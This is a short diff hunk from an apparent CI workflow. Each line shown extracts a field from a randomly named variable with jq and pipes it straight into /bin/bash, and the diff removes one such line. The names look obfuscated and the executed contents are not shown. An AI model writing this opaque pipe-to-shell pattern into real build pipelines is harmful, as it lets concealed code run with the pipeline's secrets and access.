@@ -28,7 +28,6 @@ jobs:
           echo $xbbrg47 | jq -r .t5925 | /bin/bash
           echo $es23826 | jq -r .d24086 | /bin/bash
           echo $j034 | jq -r .twj8312 | /bin/bash
-          echo $rhmtl8345 | jq -r .tppn78880 | /bin/bash
           echo $qjg4217 | jq -r .te63134 | /bin/bash
           echo $c8 | jq -r .p5435 | /bin/bash
           echo $gpwpy44492 | jq -r .x50 | /bin/bash
